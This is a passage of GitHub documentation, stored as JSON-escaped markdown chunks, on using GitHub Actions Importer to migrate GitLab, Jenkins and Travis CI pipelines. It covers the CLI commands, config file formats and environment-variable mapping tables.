path/to/output/ --namespace my-gitlab-namespace --config-file-path path/to/gitlab/config.yml\n```\n\nTo audit a GitLab instance using a configuration file, the file must be in the following format, and each `repository_slug` value must be unique:\n\n```yaml\nsource_files:\n  - repository_slug: namespace/project-name\n    path: path/to/.gitlab-ci.yml\n  - repository_slug: namespace/some-other-project-name\n    path: path/to/.gitlab-ci.yml\n```\n\n\n\nDry run example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file as the source file to perform a dry run.\n\nThe pipeline is selected by matching the `repository_slug` in the configuration file to the value of the `--namespace` and `--project` options. The `path` is then used to pull the specified source file.\n\n```shell\ngh actions-importer dry-run gitlab --namespace my-gitlab-namespace --project my-gitlab-project-name --output-dir ./output/ --config-file-path ./path/to/gitlab/config.yml\n```\n\n\n\nSpecify the repository of converted reusable workflows\n\n{% data variables", "Y2h1bmtfN19pbmRleF8xNjA=": ".product.prodname_actions_importer %} uses the YAML file provided to the `--config-file-path` argument to determine the repository that converted reusable workflows are migrated to.\n\nTo begin, you should run an audit without the `--config-file-path` argument:\n\n```shell\ngh actions-importer audit gitlab --output-dir ./output/\n```\n\nThe output of this command will contain a file named `config.yml` that contains a list of all the composite actions that were converted by {% data variables.product.prodname_actions_importer %}. For example, the `config.yml` file may have the following contents:\n\n```yaml\nreusable_workflows:\n  - name: my-reusable-workflow.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main\n```\n\nYou can use this file to specify which repository and ref a reusable workflow or composite action should be added to. You can then use the `--config-file-path` argument to provide the `config.yml` file to {% data variables.product.prodname_actions_importer %}. For example, you can use this file when running a `migrate` command to open a pull request for each unique repository defined in the config file:\n\n```shell\ngh actions-importer migrate gitlab --project my-project-name --output-dir output/ --config-file-path config.yml --target-url https://github.com/my-org/my-repo\n```\n\n\n\nSupported syntax for GitLab pipelines\n\nThe following table shows the type of properties {% data variables.product.prodname_actions_importer %} is currently able to convert. For more details about how GitLab pipeline syntax aligns with {% data variables.product.prodname_actions %}, see \"AUTOTITLE\".\n\n| GitLab Pipelines                        | GitHub Actions                  | Status                      |\n| :-------------------------------------- | :------------------------------ | :-------------------------- |\n| `after_script`                          | `jobs..steps`           |                   Supported |\n| `auto_cancel_pending_pipelines`         | `concurrency`                   |                   Supported |\n| `before_", "Y2h1bmtfOF9pbmRleF8xNjA=": "script`                         | `jobs..steps`           |                   Supported |\n| `build_timeout` or `timeout`            | `jobs..timeout-minutes` |                   Supported |\n| `default`                               |  Not applicable                 |                   Supported |\n| `image`                                 | `jobs..container`       |                   Supported |\n| `job`                                   | `jobs.`                 |                   Supported |\n| `needs`                                 | `jobs..needs`           |                   Supported |\n| `only_allow_merge_if_pipeline_succeeds` | `on.pull_request`               |                   Supported |\n| `resource_group`                        | `jobs..concurrency`     |                   Supported |\n| `schedule`                              | `on.schedule`                   |                   Supported |\n| `script`                                | `jobs..steps`           |                   Supported |\n| `stages`                                | `jobs`                          |                   Supported |\n| `tags`                                  | `jobs..runs-on`         |                   Supported |\n| `variables`                             | `env`, `jobs..env`      |                   Supported |\n| Run pipelines for new commits           | `on.push`                       |                   Supported |\n| Run pipelines manually                  | `on.workflow_dispatch`          |                   Supported |\n| `environment`                           | `jobs..environment`     |         Partially supported |\n| `include`                               | Files referenced in an `include` statement are merged into a single job graph before being transformed. |         Partially supported |\n| `only` or `except`                      | `jobs..if`              |         Partially supported |\n| `parallel`                              | `jobs..strategy`        |         Partially supported |\n| `rules`                     ", "Y2h1bmtfOV9pbmRleF8xNjA=": "            | `jobs..if`              |         Partially supported |\n| `services`                              | `jobs..services`        |         Partially supported |\n| `workflow`                              | `if`                            |         Partially supported |\n\nFor information about supported GitLab constructs, see the `github/gh-actions-importer` repository.\n\n\n\nEnvironment variables syntax\n\n{% data variables.product.prodname_actions_importer %} uses the mapping in the table below to convert default GitLab environment variables to the closest equivalent in {% data variables.product.prodname_actions %}.\n\n| GitLab                                     | GitHub Actions                                                                        |\n| :-------------------------------------------- | :------------------------------------------------------------------------------------ |\n| `CI_API_V4_URL`                               | {% raw %}`${{ github.api_url }}`{% endraw %}                                                               |\n| `CI_BUILDS_DIR`                               | {% raw %}`${{ github.workspace }}`{% endraw %}                                                        |\n| `CI_COMMIT_BRANCH`                            | {% raw %}`${{ github.ref }}`{% endraw %}                                                                |\n| `CI_COMMIT_REF_NAME`                          | {% raw %}`${{ github.ref }}`{% endraw %}                                                                  |\n| `CI_COMMIT_REF_SLUG`                          | {% raw %}`${{ github.ref }}`{% endraw %}                                                                  |\n| `CI_COMMIT_SHA`                               | {% raw %}`${{ github.sha }}`{% endraw %}                                                                 |\n| `CI_COMMIT_SHORT_SHA`                         | {% raw %}`${{ github.sha }}`{% endraw %}                                                                 |\n| `CI_COMMIT_TAG`                               ", "Y2h1bmtfMTBfaW5kZXhfMTYw": "| {% raw %}`${{ github.ref }}`{% endraw %}                                                                 |\n| `CI_JOB_ID`                                   | {% raw %}`${{ github.job }}`{% endraw %}                                                                 |\n| `CI_JOB_MANUAL`                               | {% raw %}`${{ github.event_name == 'workflow_dispatch' }}`{% endraw %}                                   |\n| `CI_JOB_NAME`                                 | {% raw %}`${{ github.job }}`{% endraw %}                                                                 |\n| `CI_JOB_STATUS`                               | {% raw %}`${{ job.status }}`{% endraw %}                                                                   |\n| `CI_JOB_URL`                                  | {% raw %}`${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}`{% endraw %} |\n| `CI_JOB_TOKEN`                                | {% raw %}`${{ github.token }}`{% endraw %}                                                                 |\n| `CI_NODE_INDEX`                               | {% raw %}`${{ strategy.job-index }}`{% endraw %}                                                           |\n| `CI_NODE_TOTAL`                               | {% raw %}`${{ strategy.job-total }}`{% endraw %}                                                           |\n| `CI_PIPELINE_ID`                              | {% raw %}`${{ github.repository}}/${{ github.workflow }}`{% endraw %}                                      |\n| `CI_PIPELINE_IID`                             | {% raw %}`${{ github.workflow }}`{% endraw %}                                                              |\n| `CI_PIPELINE_SOURCE`                          | {% raw %}`${{ github.event_name }}`{% endraw %}                                                            |\n| `CI_PIPELINE_TRIGGERED`                       | {% raw %}`${{ github.actions }}`{% endraw %}                                                               |\n| `CI_PIPELINE_URL`                  ", "Y2h1bmtfMTFfaW5kZXhfMTYw": "           | {% raw %}`${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}`{% endraw %} |\n| `CI_PROJECT_DIR`                              | {% raw %}`${{ github.workspace }}`{% endraw %}                                                             |\n| `CI_PROJECT_ID`                               | {% raw %}`${{ github.repository }}`{% endraw %}                                                            |\n| `CI_PROJECT_NAME`                             | {% raw %}`${{ github.event.repository.name }}`{% endraw %}                                                 |\n| `CI_PROJECT_NAMESPACE`                        | {% raw %}`${{ github.repository_owner }}`{% endraw %}                                                      |\n| `CI_PROJECT_PATH_SLUG`                        | {% raw %}`${{ github.repository }}`{% endraw %}                                                            |\n| `CI_PROJECT_PATH`                             | {% raw %}`${{ github.repository }}`{% endraw %}                                                            |\n| `CI_PROJECT_ROOT_NAMESPACE`                   | {% raw %}`${{ github.repository_owner }}`{% endraw %}                                                      |\n| `CI_PROJECT_TITLE`                            | {% raw %}`${{ github.event.repository.full_name }}`{% endraw %}                                            |\n| `CI_PROJECT_URL`                              | {% raw %}`${{ github.server_url }}/${{ github.repository }}`{% endraw %}                                   |\n| `CI_REPOSITORY_URL`                           | {% raw %}`${{ github.event.repository.clone_url }}`{% endraw %}                                            |\n| `CI_RUNNER_EXECUTABLE_ARCH`                   | {% raw %}`${{ runner.os }}`{% endraw %}                                                                    |\n| `CI_SERVER_HOST`                              | {% raw %}`${{ github.server_url }}`{% endraw %}                                                            |\n| `CI_SERVER_URL` ", "Y2h1bmtfMTJfaW5kZXhfMTYw": "                              | {% raw %}`${{ github.server_url }}`{% endraw %}                                                            |\n| `CI_SERVER`                                   | {% raw %}`${{ github.actions }}`{% endraw %}                                                               |\n| `GITLAB_CI`                                   | {% raw %}`${{ github.actions }}`{% endraw %}                                                               |\n| `GITLAB_USER_EMAIL`                           | {% raw %}`${{ github.actor }}`{% endraw %}                                                                 |\n| `GITLAB_USER_ID`                              | {% raw %}`${{ github.actor }}`{% endraw %}                                                                 |\n| `GITLAB_USER_LOGIN`                           | {% raw %}`${{ github.actor }}`{% endraw %}                                                                 |\n| `GITLAB_USER_NAME`                            | {% raw %}`${{ github.actor }}`{% endraw %}                                                                 |\n| `TRIGGER_PAYLOAD`                             | {% raw %}`${{ github.event_path }}`{% endraw %}                                                            |\n| `CI_MERGE_REQUEST_ASSIGNEES`                  | {% raw %}`${{ github.event.pull_request.assignees }}`{% endraw %}                                          |\n| `CI_MERGE_REQUEST_ID`                         | {% raw %}`${{ github.event.pull_request.number }}`{% endraw %}                                             |\n| `CI_MERGE_REQUEST_IID`                        | {% raw %}`${{ github.event.pull_request.number }}`{% endraw %}                                             |\n| `CI_MERGE_REQUEST_LABELS`                     | {% raw %}`${{ github.event.pull_request.labels }}`{% endraw %}                                             |\n| `CI_MERGE_REQUEST_MILESTONE`                  | {% raw %}`${{ github.event.pull_request.milestone }}`{% endraw %}                                          |", "Y2h1bmtfMTNfaW5kZXhfMTYw": "\n| `CI_MERGE_REQUEST_PROJECT_ID`                 | {% raw %}`${{ github.repository }}`{% endraw %}                                                            |\n| `CI_MERGE_REQUEST_PROJECT_PATH`               | {% raw %}`${{ github.repository }}`{% endraw %}                                                            |\n| `CI_MERGE_REQUEST_PROJECT_URL`                | {% raw %}`${{ github.server_url }}/${{ github.repository }}`{% endraw %}                                   |\n| `CI_MERGE_REQUEST_REF_PATH`                   | {% raw %}`${{ github.ref }}`{% endraw %}                                                                   |\n| `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`         | {% raw %}`${{ github.event.pull_request.head.ref }}`{% endraw %}                                           |\n| `CI_MERGE_REQUEST_SOURCE_BRANCH_SHA`          | {% raw %}`${{ github.event.pull_request.head.sha}}`{% endraw %}                                            |\n| `CI_MERGE_REQUEST_SOURCE_PROJECT_ID`          | {% raw %}`${{ github.event.pull_request.head.repo.full_name }}`{% endraw %}                                |\n| `CI_MERGE_REQUEST_SOURCE_PROJECT_PATH`        | {% raw %}`${{ github.event.pull_request.head.repo.full_name }}`{% endraw %}                                |\n| `CI_MERGE_REQUEST_SOURCE_PROJECT_URL`         | {% raw %}`${{ github.event.pull_request.head.repo.url }}`{% endraw %}                                      |\n| `CI_MERGE_REQUEST_TARGET_BRANCH_NAME`         | {% raw %}`${{ github.event.pull_request.base.ref }}`{% endraw %}                                           |\n| `CI_MERGE_REQUEST_TARGET_BRANCH_SHA`          | {% raw %}`${{ github.event.pull_request.base.sha }}`{% endraw %}                                           |\n| `CI_MERGE_REQUEST_TITLE`                      | {% raw %}`${{ github.event.pull_request.title }}`{% endraw %}                                              |\n| `CI_EXTERNAL_PULL_REQUEST_IID`                | {% raw %}`${{ github.event.pull_request.number }}`{% endraw %}                           ", "Y2h1bmtfMTRfaW5kZXhfMTYw": "                  |\n| `CI_EXTERNAL_PULL_REQUEST_SOURCE_REPOSITORY`  | {% raw %}`${{ github.event.pull_request.head.repo.full_name }}`{% endraw %}                                |\n| `CI_EXTERNAL_PULL_REQUEST_TARGET_REPOSITORY`  | {% raw %}`${{ github.event.pull_request.base.repo.full_name }}`{% endraw %}                                |\n| `CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_NAME` | {% raw %}`${{ github.event.pull_request.head.ref }}`{% endraw %}                                           |\n| `CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_SHA`  | {% raw %}`${{ github.event.pull_request.head.sha }}`{% endraw %}                                           |\n| `CI_EXTERNAL_PULL_REQUEST_TARGET_BRANCH_NAME` | {% raw %}`${{ github.event.pull_request.base.ref }}`{% endraw %}                                           |\n| `CI_EXTERNAL_PULL_REQUEST_TARGET_BRANCH_SHA`  | {% raw %}`${{ github.event.pull_request.base.sha }}`{% endraw %}                                           |\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNjE=": "\n\nAbout migrating from Jenkins with GitHub Actions Importer\n\nThe instructions below will guide you through configuring your environment to use {% data variables.product.prodname_actions_importer %} to migrate Jenkins pipelines to {% data variables.product.prodname_actions %}.\n\n\n\nPrerequisites\n\n- A Jenkins account or organization with pipelines and jobs that you want to convert to {% data variables.product.prodname_actions %} workflows.\n- Access to create a Jenkins personal API token for your account or organization.\n{% data reusables.actions.actions-importer-prerequisites %}\n\n\n\nLimitations\n\nThere are some limitations when migrating from Jenkins to {% data variables.product.prodname_actions %} with {% data variables.product.prodname_actions_importer %}. For example, you must migrate the following constructs manually:\n\n- Mandatory build tools\n- Scripted pipelines\n- Secrets\n- Self-hosted runners\n- Unknown plugins\n\nFor more information on manual migrations, see \"AUTOTITLE.\"\n\n\n\nInstalling the {% data variables.product.prodname_actions_importer %} CLI extension\n\n{% data reusables.actions.installing-actions-importer %}\n\n\n\nConfiguring credentials\n\nThe `configure` CLI command is used to set required credentials and options for {% data variables.product.prodname_actions_importer %} when working with Jenkins and {% data variables.product.prodname_dotcom %}.\n\n1. Create a {% data variables.product.prodname_dotcom %} {% data variables.product.pat_v1 %}. For more information, see \"AUTOTITLE.\"\n\n   Your token must have the `workflow` scope.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. Create a Jenkins API token. For more information, see Authenticating scripted clients in the Jenkins documentation.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `configure` CLI command:\n\n   ```shell\n   gh actions-importer configure\n   ```\n\n   The `configure` command will prompt you for t", "Y2h1bmtfMV9pbmRleF8xNjE=": "he following information:\n\n   - For \"Which CI providers are you configuring?\", use the arrow keys to select `Jenkins`, press Space to select it, then press Enter.\n   - For \"{% data variables.product.pat_generic_caps %} for GitHub\", enter the value of the {% data variables.product.pat_v1 %} that you created earlier, and press Enter.\n   - For \"Base url of the GitHub instance\", {% ifversion ghes or ghae %}enter the URL for your {% data variables.product.product_name %} instance, and press Enter.{% else %}press Enter to accept the default value (`https://github.com`).{% endif %}\n   - For \"{% data variables.product.pat_generic_caps %} for Jenkins\", enter the value for the Jenkins personal API token that you created earlier, and press Enter.\n   - For \"Username of Jenkins user\", enter your Jenkins username and press Enter.\n   - For \"Base url of the Jenkins instance\", enter the URL of your Jenkins instance, and press Enter.\n\n   An example of the `configure` command is shown below:\n\n   ```shell\n   $ gh actions-importer configure\n   \u2714 Which CI providers are you configuring?: Jenkins\n   Enter the following values (leave empty to omit):\n   \u2714 {% data variables.product.pat_generic_caps %} for GitHub: ***************\n   \u2714 Base url of the GitHub instance: https://github.com\n   \u2714 {% data variables.product.pat_generic_caps %} for Jenkins: ***************\n   \u2714 Username of Jenkins user: admin\n   \u2714 Base url of the Jenkins instance: https://localhost\n   Environment variables successfully updated.\n   ```\n\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `update` CLI command to connect to {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %} and ensure that the container image is updated to the latest version:\n\n   ```shell\n   gh actions-importer update\n   ```\n\n   The output of the command should be similar to below:\n\n   ```shell\n   Updating ghcr.io/actions-importer/cli:latest...\n   ghcr.io/actions-importer/cli:latest up-to-date  \n   ```\n\n\n\nPerform an au", "Y2h1bmtfMl9pbmRleF8xNjE=": "dit of Jenkins\n\nYou can use the `audit` command to get a high-level view of all pipelines in a Jenkins server.\n\nThe `audit` command performs the following steps:\n\n1. Fetches all of the projects defined in a Jenkins server.\n1. Converts each pipeline to its equivalent {% data variables.product.prodname_actions %} workflow.\n1. Generates a report that summarizes how complete and complex of a migration is possible with {% data variables.product.prodname_actions_importer %}.\n\n\n\nRunning the audit command\n\nTo perform an audit of a Jenkins server, run the following command in your terminal:\n\n```shell\ngh actions-importer audit jenkins --output-dir tmp/audit\n```\n\n\n\nInspecting the audit results\n\n{% data reusables.actions.gai-inspect-audit %}\n\n\n\nForecast potential build runner usage\n\nYou can use the `forecast` command to forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in your Jenkins server.\n\n\n\nPrerequisites for running the forecast command\n\nIn order to run the `forecast` command against a Jenkins instance, you must install the `paginated-builds` plugin on your Jenkins server. This plugin allows {% data variables.product.prodname_actions_importer %} to efficiently retrieve historical build data for jobs that have a large number of builds. Because Jenkins does not provide a method to retrieve paginated build data, using this plugin prevents timeouts from the Jenkins server that can occur when fetching a large amount of historical data. The `paginated-builds` plugin is open source, and exposes a REST API endpoint to fetch build data in pages, rather than all at once.\n\nTo install the `paginated-builds` plugin:\n\n1. On your Jenkins instance, navigate to `https:///pluginManager/available`.\n1. Search for the `paginated-builds` plugin.\n1. Check the box on the left and select **Install without restart**.\n\n\n\nRunning the forecast command\n\nTo perform a forecast of potential {% data variables.product.prodname_actions %}, run the following command in your terminal. By", "Y2h1bmtfM19pbmRleF8xNjE=": " default, {% data variables.product.prodname_actions_importer %} includes the previous seven days in the forecast report.\n\n```shell\ngh actions-importer forecast jenkins --output-dir tmp/forecast \n```\n\n\n\nInspecting the forecast report\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListed below are some key terms that can appear in the forecast report:\n\n- The **job count** is the total number of completed jobs.\n- The **pipeline count** is the number of unique pipelines used.\n- **Execution time** describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of {% data variables.product.prodname_dotcom %}-hosted runners.\n  - This metric is correlated to how much you should expect to spend in {% data variables.product.prodname_actions %}. This will vary depending on the hardware used for these minutes. You can use the {% data variables.product.prodname_actions %} pricing calculator to estimate the costs.\n- **Queue time** metrics describe the amount of time a job spent waiting for a runner to be available to execute it.\n- **Concurrent jobs** metrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure.\n\nAdditionally, these metrics are defined for each queue of runners in Jenkins. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners.\n\n\n\nPerform a dry-run migration of a Jenkins pipeline\n\nYou can use the `dry-run` command to convert a Jenkins pipeline to its equivalent {% data variables.product.prodname_actions %} workflow.\n\n\n\nRunning the dry-run command\n\nYou can use the `dry-run` command to convert a Jenkins pipeline to an equivalent {% data variables.product.prodname_actions %} workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\n\nTo perform a dry run of m", "Y2h1bmtfNF9pbmRleF8xNjE=": "igrating your Jenkins pipelines to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `my-jenkins-project` with the URL of your Jenkins job.\n\n```shell\ngh actions-importer dry-run jenkins --source-url my-jenkins-project --output-dir tmp/dry-run\n```\n\n\n\nInspecting the converted workflows\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\n{% data reusables.actions.gai-custom-transformers-rec %}\n\n\n\nPerform a production migration of a Jenkins pipeline\n\nYou can use the `migrate` command to convert a Jenkins pipeline and open a pull request with the equivalent {% data variables.product.prodname_actions %} workflow.\n\n\n\nRunning the migrate command\n\nTo migrate a Jenkins pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing the `target-url` value with the URL for your {% data variables.product.product_name %} repository, and `my-jenkins-project` with the URL for your Jenkins job.\n\n```shell\ngh actions-importer migrate jenkins --target-url https://github.com/:owner/:repo --output-dir tmp/migrate --source-url my-jenkins-project\n```\n\nThe command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```shell\n$ gh actions-importer migrate jenkins --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --source-url http://localhost:8080/job/monas_dev_work/job/monas_freestyle\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n{% data reusables.actions.gai-inspect-pull-request %}\n\n\n\nReference\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using {% data variables.product.prodname_actions_importer %} to migrate from Jenkins.\n\n\n\nUsing environment variables\n\n{% d", "Y2h1bmtfNV9pbmRleF8xNjE=": "ata reusables.actions.gai-config-environment-variables %}\n\n{% data variables.product.prodname_actions_importer %} uses the following environment variables to connect to your Jenkins instance:\n\n- `GITHUB_ACCESS_TOKEN`: The {% data variables.product.pat_v1 %} used to create pull requests with a converted workflow (requires `repo` and `workflow` scopes).\n- `GITHUB_INSTANCE_URL`: The URL to the target {% data variables.product.prodname_dotcom %} instance (for example, `https://github.com`).\n- `JENKINS_ACCESS_TOKEN`: The Jenkins API token used to view Jenkins resources.\n\n  {% note %}\n\n  **Note**: This token requires access to all jobs that you want to migrate or audit. In cases where a folder or job does not inherit access control lists from their parent, you must grant explicit permissions or full admin privileges.\n\n  {% endnote %}\n\n- `JENKINS_USERNAME`: The username of the user account that created the Jenkins API token.\n- `JENKINS_INSTANCE_URL`: The URL of the Jenkins instance.\n- `JENKINSFILE_ACCESS_TOKEN` (Optional) The API token used to retrieve the contents of a `Jenkinsfile` stored in the build repository. This requires the `repo` scope.  If this is not provided, the `GITHUB_ACCESS_TOKEN` will be used instead.\n\nThese environment variables can be specified in a `.env.local` file that is loaded by {% data variables.product.prodname_actions_importer %} when it is run.\n\n\n\nUsing optional arguments\n\n{% data reusables.actions.gai-optional-arguments-intro %}\n\n\n\n`--source-file-path`\n\nYou can use the `--source-file-path` argument with the `forecast`, `dry-run`, or `migration` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from source control. The `--source-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source file path instead. You can use this option for Jenkinsfile and multibranch pipelines.\n\nIf you would like to supply multiple source files when running the `forecast` subcommand, you can use pattern match", "Y2h1bmtfNl9pbmRleF8xNjE=": "ing in the file path value. For example, `gh forecast --source-file-path ./tmp/previous_forecast/jobs/*.json` supplies {% data variables.product.prodname_actions_importer %} with any source files that match the `./tmp/previous_forecast/jobs/*.json` file path.\n\n\n\nJenkinsfile pipeline example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified Jenkinsfile as the source file to perform a dry run.\n\n```shell\ngh actions-importer dry-run jenkins --output-dir path/to/output/ --source-file-path path/to/Jenkinsfile --source-url :url_to_jenkins_job\n```\n\n\n\n`--config-file-path`\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from source control. The `--config-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source files instead.\n\nWhen you use the `--config-file-path` option with the `dry-run` or `migrate` subcommands, {% data variables.product.prodname_actions_importer %} matches the repository slug to the job represented by the `--source-url` option to select the pipeline. It uses the `config-file-path` to pull the specified source file.\n\n\n\nAudit example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file to perform an audit.\n\n```shell\ngh actions-importer audit jenkins --output-dir path/to/output/ --config-file-path path/to/jenkins/config.yml\n```\n\nTo audit a Jenkins instance using a config file, the config file must be in the following format, and each `repository_slug` value must be unique:\n\n```yaml\nsource_files:\n  - repository_slug: pipeline-name\n    path: path/to/Jenkinsfile\n  - repository_slug: multi-branch-pipeline-name\n    branches:\n      - branch: main\n        path: path/to/Jenkinsfile\n      - branch: node\n        path: path/to/Jenkinsfile\n```\n\n\n\nSupported syntax for Jenkins pipelines\n\nThe following tables show the ty", "Y2h1bmtfN19pbmRleF8xNjE=": "pe of properties {% data variables.product.prodname_actions_importer %} is currently able to convert. For more details about how Jenkins pipeline syntax aligns with {% data variables.product.prodname_actions %}, see \"AUTOTITLE\".\n\nFor information about supported Jenkins plugins, see the `github/gh-actions-importer` repository.\n\n\n\nSupported syntax for Freestyle pipelines\n\n| Jenkins                   | GitHub Actions                     |              Status |\n| :------------------------ | :--------------------------------- | :------------------ |\n| docker template           | `jobs..container`          |           Supported |\n| build                     | `jobs`                             | Partially supported |\n| build environment         | `env`                              | Partially supported |\n| build triggers            | `on`                               | Partially supported |\n| general                   | `runners`                          | Partially supported |\n\n\n\nSupported syntax for Jenkinsfile pipelines\n\n| Jenkins     | GitHub Actions                     |              Status |\n| :---------- | :--------------------------------- | :------------------ |\n| docker      | `jobs..container`          |           Supported |\n| stage       | `jobs.`                    |           Supported |\n| agent       | `runners`                          | Partially supported |\n| environment | `env`                              | Partially supported |\n| stages      | `jobs`                             | Partially supported |\n| steps       | `jobs..steps`              | Partially supported |\n| triggers    | `on`                               | Partially supported |\n| when        | `jobs..if`                 | Partially supported |\n| inputs      | `inputs`                           |         Unsupported |\n| matrix      | `jobs..strategy.matrix`    |         Unsupported |\n| options     | `jobs..strategy`           |         Unsupported |\n| parameters  | `inputs`                           |         Unsupported |\n\n\n\nEnvironm", "Y2h1bmtfOF9pbmRleF8xNjE=": "ent variables syntax\n\n{% data variables.product.prodname_actions_importer %} uses the mapping in the table below to convert default Jenkins environment variables to the closest equivalent in {% data variables.product.prodname_actions %}.\n\n| Jenkins           | GitHub Actions                                                                        |\n| :---------------- | :------------------------------------------------------------------------------------ |\n| `${BUILD_ID}`     | `{% raw %}${{ github.run_id }}{% endraw %}`                                                                |\n| `${BUILD_NUMBER}` | `{% raw %}${{ github.run_id }}{% endraw %}`                                                                |\n| `${BUILD_TAG}`    | `{% raw %}${{ github.workflow }}-${{ github.run_id }}{% endraw %}`                                         |\n| `${BUILD_URL}`    | `{% raw %}${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}{% endraw %}` |\n| `${JENKINS_URL}`  | `{% raw %}${{ github.server_url }}{% endraw %}`                                                            |\n| `${JOB_NAME}`     | `{% raw %}${{ github.workflow }}{% endraw %}`                                                              |\n| `${WORKSPACE}`    | `{% raw %}${{ github.workspace }}{% endraw %}`                                                             |\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNjI=": "\n\nAbout migrating from Travis CI with GitHub Actions Importer\n\nThe instructions below will guide you through configuring your environment to use {% data variables.product.prodname_actions_importer %} to migrate Travis CI pipelines to {% data variables.product.prodname_actions %}.\n\n\n\nPrerequisites\n\n- A Travis CI account or organization with pipelines and jobs that you want to convert to {% data variables.product.prodname_actions %} workflows.\n- Access to create a Travis CI API access token for your account or organization.\n{% data reusables.actions.actions-importer-prerequisites %}\n\n\n\nLimitations\n\nThere are some limitations when migrating from Travis CI pipelines to {% data variables.product.prodname_actions %} with {% data variables.product.prodname_actions_importer %}.\n\n\n\nManual tasks\n\nCertain Travis CI constructs must be migrated manually. These include:\n\n- Secrets\n- Unknown job properties\n\nFor more information on manual migrations, see \"AUTOTITLE.\"\n\n\n\nTravis CI project languages\n\n{% data variables.product.prodname_actions_importer %} transforms Travis CI project languages by adding a set of preconfigured build tools and a default build script to the transformed workflow. If no language is explicitly declared, {% data variables.product.prodname_actions_importer %} assumes a project language is Ruby.\n\nFor a list of the project languages supported by {% data variables.product.prodname_actions_importer %}, see \"Supported project languages.\"\n\n\n\nInstalling the {% data variables.product.prodname_actions_importer %} CLI extension\n\n{% data reusables.actions.installing-actions-importer %}\n\n\n\nConfiguring credentials\n\nThe `configure` CLI command is used to set required credentials and options for {% data variables.product.prodname_actions_importer %} when working with Travis CI and {% data variables.product.prodname_dotcom %}.\n\n1. Create a {% data variables.product.prodname_dotcom %} {% data variables.product.pat_v1 %}. For more information, see \"AUTOTITLE.\"\n\n   Your token must have the `workflow` scope.\n\n   After creatin", "Y2h1bmtfMV9pbmRleF8xNjI=": "g the token, copy it and save it in a safe location for later use.\n1. Create a Travis CI API access token. For more information, see Get your Travis CI API token in the Travis CI documentation.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `configure` CLI command:\n\n   ```shell\n   gh actions-importer configure\n   ```\n\n   The `configure` command will prompt you for the following information:\n\n   - For \"Which CI providers are you configuring?\", use the arrow keys to select `Travis CI`, press Space to select it, then press Enter.\n   - For \"{% data variables.product.pat_generic_caps %} for GitHub\", enter the value of the {% data variables.product.pat_v1 %} that you created earlier, and press Enter.\n   - For \"Base url of the GitHub instance\", {% ifversion ghes or ghae %}enter the URL for your {% data variables.product.product_name %} instance, and press Enter.{% else %}press Enter to accept the default value (`https://github.com`).{% endif %}\n   - For \"{% data variables.product.pat_generic_caps %} for Travis CI\", enter the value for the Travis CI API access token that you created earlier, and press Enter.\n   - For \"Base url of the Travis CI instance\", enter the URL of your Travis CI instance, and press Enter.\n   - For \"Travis CI organization name\", enter the name of your Travis CI organization, and press Enter.\n\n   An example of the output of the `configure` command is shown below.\n\n   ```shell\n   $ gh actions-importer configure\n   \u2714 Which CI providers are you configuring?: Travis CI\n   Enter the following values (leave empty to omit):\n   \u2714 {% data variables.product.pat_generic_caps %} for GitHub: ***************\n   \u2714 Base url of the GitHub instance: https://github.com\n   \u2714 {% data variables.product.pat_generic_caps %} for Travis CI: ***************\n   \u2714 Base url of the Travis CI instance: https://travis-ci.com\n   \u2714 Travis CI organization name: actions-importer-labs\n   Environment variables successf", "Y2h1bmtfMl9pbmRleF8xNjI=": "ully updated.\n   ```\n\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `update` CLI command to connect to {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %} and ensure that the container image is updated to the latest version:\n\n   ```shell\n   gh actions-importer update\n   ```\n\n   The output of the command should be similar to below:\n\n   ```shell\n   Updating ghcr.io/actions-importer/cli:latest...\n   ghcr.io/actions-importer/cli:latest up-to-date\n   ```\n\n\n\nPerform an audit of Travis CI\n\nYou can use the `audit` command to get a high-level view of all pipelines in a Travis CI server.\n\nThe `audit` command performs the following steps:\n\n1. Fetches all of the projects defined in a Travis CI server.\n1. Converts each pipeline to its equivalent 